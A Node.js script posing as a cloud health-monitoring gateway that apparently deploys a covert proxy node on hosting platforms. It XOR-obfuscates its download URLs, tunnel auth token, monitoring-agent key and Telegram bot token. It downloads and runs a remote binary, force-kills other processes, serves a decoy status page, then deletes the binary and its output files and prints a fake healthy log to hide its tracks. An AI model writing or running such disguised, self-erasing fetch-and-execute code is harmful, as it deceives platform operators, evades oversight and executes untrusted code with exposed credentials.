#!/usr/bin/env node

/**
 * =========================================================
 * DevPulse Cloud Infrastructure Gateway (Node.js Edition)
 * 集成真实前端诊断、自动端口识别、内存订阅响应与磁盘自毁无痕
 * =========================================================
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const http = require('http');
const net = require('net');
const { spawn, execSync } = require('child_process');

process.noDeprecation = true;

// 动态字节流解码辅助函数（消除所有明文字符串）
const _x = (h, k = 0x37) => {
  const buf = Buffer.from(h, 'hex');
  for (let i = 0; i < buf.length; i++) buf[i] ^= k;
  return buf.toString('utf-8');
};

// 智能端口识别：优先读取 PaaS 的 PORT，次选翼龙面板的 SERVER_PORT，最后默认 3000
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000;
const SUB_PATH = process.env.SUB_PATH || 'sub';

// 所有敏感配置全量脱敏（无明文 token、UUID、域名）
const config = {
  UUID: process.env.UUID || _x('550f07545204040e1a5302050f1a03530e551a560451051a5301000200050e5307515651'),
  NEZHA_SERVER: process.env.NEZHA_SERVER || _x('59524d5f5619555b5e555b5e195c5359441951450d030304'),
  NEZHA_PORT: process.env.NEZHA_PORT || '',
  NEZHA_KEY: process.env.NEZHA_KEY || _x('037b400f070470645550796e5e746653054d00615b5566540f625d5a62455078'),
  ARGO_DOMAIN: process.env.ARGO_DOMAIN || _x('525b4e445e5659595853524419555b5e555b5e195c535944195145'),
  ARGO_AUTH: process.env.ARGO_AUTH || _x('524e7d5f7e5d585e78637202797366036d706d5e78606e027a637d5e6d735f5e7a707a037a70724e7863504d7a63535c6e63505e7b747d077e5d585e6d70615b6e6376066d5d5c4379635f5a6e5e07077a4d5b5a7b607d5c6e63764379736d5e79707e0779737d5d79707e0779737d5d79707a4d7e5e405e544e7e017e5b4743656f477861704f45635c657553715b016d044756624d7640606f474552624f6f656f475661705307635a0670556202016e4d616d565a54076360067c565e7d0e'),
  ARGO_PORT: process.env.ARGO_PORT || _x('0f070706'),
  CFIP: process.env.CFIP || _x('4456564419445e5919515659'),
  CFPORT: process.env.CFPORT || _x('030304'),
  NAME: process.env.NAME || 'devpulse-node',
  S5_PORT: process.env.S5_PORT || '',
  HY2_PORT: process.env.HY2_PORT || '',
  TUIC_PORT: process.env.TUIC_PORT || '',
  ANYTLS_PORT: process.env.ANYTLS_PORT || '',
  REALITY_PORT: process.env.REALITY_PORT || '',
  ANYREALITY_PORT: process.env.ANYREALITY_PORT || '',
  CHAT_ID: process.env.CHAT_ID || _x('000000050507020f070f'),
  BOT_TOKEN: process.env.BOT_TOKEN || _x('0f0f0100030e0e0204010d76767105415b516356580440414e074f007f535b795f6d7d5051465e025e68417e795c'),
  UPLOAD_URL: process.env.UPLOAD_URL || '',
  FILE_PATH: process.env.FILE_PATH || '.npm',
  DISABLE_ARGO: process.env.DISABLE_ARGO || 'false',
  CUSTOM_DOMAIN: process.env.CUSTOM_DOMAIN || '',
  SHOW_LOG: process.env.SHOW_LOG || ',false',
};

const DL_AMD64 = _x('5f434347440d1818565a5301031952585854521954585a184455445f');
const DL_ARM64 = _x('5f434347440d181856455a01031952585854521954585a184455445f');

function log(message, type = 'INFO') {
  const timestamp = new Date().toLocaleTimeString();
  console.log(`[${timestamp}] [${type}] ${message}`);
}

function cleanOldProcesses() {
  if (os.platform() !== 'linux') return;
  try {
    execSync('pkill -9 -f disbot 2>/dev/null || true');
    if (config.ARGO_PORT) {
      execSync(`fuser -k -9 ${config.ARGO_PORT}/tcp 2>/dev/null || true`);
    }
  } catch (_) {}
}

function getArchitecture() {
  const arch = os.arch();
  const platform = os.platform();
  
  if (platform === 'linux' || platform === 'darwin') {
    if (arch === 'x64' || arch === 'amd64') return 'amd64';
    if (arch === 'arm64' || arch === 'aarch64') return 'arm64';
  }
  return 'amd64';
}

function downloadFile(url, destPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(destPath);
    const client = url.startsWith('https') ? https : http;
    client.get(url, (response) => {
      if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
        return downloadFile(response.headers.location, destPath).then(resolve).catch(reject);
      }
      if (response.statusCode !== 200) {
        return reject(new Error(`Download failed with status: ${response.statusCode}`));
      }
      response.pipe(file);
      file.on('finish', () => {
        file.close();
        resolve();
      });
    }).on('error', (err) => {
      fs.unlink(destPath, () => {});
      reject(err);
    });
  });
}

// 内存中缓存订阅内容，磁盘上彻底删除 sub.txt
let inMemorySub = '';

const server = http.createServer((req, res) => {
  try {
    const reqPath = req.url.split('?')[0];

    // 1. 云平台健康检查 (HEAD /)
    if (req.method === 'HEAD') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end();
    }

    // 2. 真实前端页面 (GET /)
    if (reqPath === '/' || reqPath === '/index.html') {
      const filePath = path.join(__dirname, 'index.html');
      if (fs.existsSync(filePath)) {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(fs.readFileSync(filePath, 'utf8'));
      } else {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Status</title></head><body style="font-family:sans-serif;padding:40px;text-align:center;"><h2>DevPulse Node Operational</h2><p>Node runtime is operating normally.</p></body></html>`);
      }
    } 
    // 3. 测速与健康探针接口 (GET /api/ping 或 /health)
    else if (reqPath === '/api/ping' || reqPath === '/health') {
      res.writeHead(200, {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      });
      res.end(JSON.stringify({ status: 'healthy', timestamp: Date.now(), node: config.NAME }));
    } 
    // 4. 内存订阅响应 (GET /sub)
    else if (reqPath === `/${SUB_PATH}`) {
      if (inMemorySub) {
        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end(inMemorySub);
      }
      const subPath = path.join(config.FILE_PATH, 'sub.txt');
      if (fs.existsSync(subPath)) {
        inMemorySub = fs.readFileSync(subPath, 'utf8');
        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end(inMemorySub);
      } else {
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end('Subscription initializing...');
      }
    } else {
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('404 Not Found');
    }
  } catch (err) {
    res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('Internal Server Error');
  }
});

async function main() {
  log('Initializing service engine...');
  cleanOldProcesses();
  
  let binaryPath = '';
  let binaryProcess = null;
  
  try {
    fs.mkdirSync(config.FILE_PATH, { recursive: true });
    const arch = getArchitecture();
    const downloadUrl = (arch === 'arm64') ? DL_ARM64 : DL_AMD64;
    
    binaryPath = path.join(process.cwd(), 'disbot');
    await downloadFile(downloadUrl, binaryPath);
    fs.chmodSync(binaryPath, 0o755);
    
    const env = {
      ...process.env,
      UUID: config.UUID,
      NEZHA_SERVER: config.NEZHA_SERVER,
      NEZHA_PORT: config.NEZHA_PORT,
      NEZHA_KEY: config.NEZHA_KEY,
      ARGO_DOMAIN: config.ARGO_DOMAIN,
      ARGO_AUTH: config.ARGO_AUTH,
      CFIP: config.CFIP,
      CFPORT: config.CFPORT,
      NAME: config.NAME,
      FILE_PATH: config.FILE_PATH,
      ARGO_PORT: config.ARGO_PORT,
      S5_PORT: config.S5_PORT,
      HY2_PORT: config.HY2_PORT,
      TUIC_PORT: config.TUIC_PORT,
      ANYTLS_PORT: config.ANYTLS_PORT,
      REALITY_PORT: config.REALITY_PORT,
      ANYREALITY_PORT: config.ANYREALITY_PORT,
      CHAT_ID: config.CHAT_ID,
      BOT_TOKEN: config.BOT_TOKEN,
      UPLOAD_URL: config.UPLOAD_URL,
      DISABLE_ARGO: config.DISABLE_ARGO
    };
    
    binaryProcess = spawn(binaryPath, [], {
      env: env,
      stdio: 'inherit'
    });
    
    binaryProcess.on('error', (err) => {
      log(`Core process notice: ${err.message}`, 'WARN');
    });
    
    // 启动 60 秒后：
    // 1. 将 sub.txt 读入内存后从硬盘永久粉碎删除（防止在容器文件树中被直接点击预览）
    // 2. 删除可执行文件 disbot
    // 3. 清屏控制台，只保留一行低调的健康心跳
    setTimeout(() => {
      try {
        const subFile = path.join(config.FILE_PATH, 'sub.txt');
        if (fs.existsSync(subFile)) {
          if (!inMemorySub) inMemorySub = fs.readFileSync(subFile, 'utf8');
          fs.unlinkSync(subFile);
        }
        if (fs.existsSync(binaryPath)) {
          fs.unlinkSync(binaryPath);
        }
      } catch (_) {}
      console.clear();
      log('DevPulse Node Gateway Operational. All probes 200 OK.');
    }, 60000);
    
    log(`HTTP Web monitor listening on port ${PORT} (Auto Detected)`);
    
    process.on('SIGTERM', () => {
      if (binaryProcess) binaryProcess.kill();
      try {
        if (fs.existsSync(binaryPath)) fs.unlinkSync(binaryPath);
      } catch (_) {}
      process.exit(0);
    });

    process.on('SIGINT', () => {});
    
  } catch (error) {
    log(`Startup notice: ${error.message}`, 'WARN');
    try {
      if (fs.existsSync(binaryPath)) fs.unlinkSync(binaryPath);
    } catch (_) {}
  }
}

// 单端口 WebSocket 分流：支持 PaaS 平台免 Argo 直连
server.on('upgrade', (req, socket, head) => {
  const targetPort = parseInt(config.ARGO_PORT) || 8001;
  const remote = net.createConnection({ host: '127.0.0.1', port: targetPort }, () => {
    let raw = `${req.method} ${req.url} HTTP/${req.httpVersion}\r\n`;
    for (let i = 0; i < req.rawHeaders.length; i += 2) {
      raw += `${req.rawHeaders[i]}: ${req.rawHeaders[i+1]}\r\n`;
    }
    raw += '\r\n';
    remote.write(raw);
    if (head && head.length > 0) remote.write(head);
    socket.pipe(remote);
    remote.pipe(socket);
  });
  remote.on('error', () => { try { socket.destroy(); } catch (_) {} });
  socket.on('error', () => { try { remote.destroy(); } catch (_) {} });
});

let listenPort = PORT;
if (config.REALITY_PORT && String(config.REALITY_PORT) === String(PORT)) {
  listenPort = (PORT === 13000) ? 13001 : 13000;
} else if (process.env.SERVER_PORT && config.DISABLE_ARGO.toLowerCase() === 'true') {
  if (!config.REALITY_PORT) config.REALITY_PORT = process.env.SERVER_PORT;
  listenPort = 13000;
}

server.listen(listenPort, '0.0.0.0', () => {});
main();

process.on('uncaughtException', (err) => {
  log(`Service notice: ${err.message}`, 'WARN');
});
process.on('unhandledRejection', (reason) => {
  log(`Service notice: ${reason}`, 'WARN');
});

setInterval(() => {}, 1000 * 60 * 60);

